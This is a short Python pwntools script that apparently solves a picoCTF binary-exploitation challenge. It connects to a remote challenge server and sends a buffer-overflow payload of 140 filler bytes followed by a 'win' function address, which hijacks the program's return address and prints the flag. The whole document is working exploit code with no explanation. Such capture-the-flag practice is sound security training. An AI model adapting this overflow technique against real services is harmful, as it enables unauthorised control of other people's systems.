#!/usr/bin/env python3

from pwn import *

exe_path = './vuln.exe'

def conn():
    
    r = remote("saturn.picoctf.net", 62608)

    return r


def main():
    r = conn()

    win_addr = 0x401530

    r.recvuntil(b'string!\r\n')
    r.sendline(b'A'*140 + p64(win_addr))

    print(r.recvuntil(b'}'))


if __name__ == "__main__":
    main()
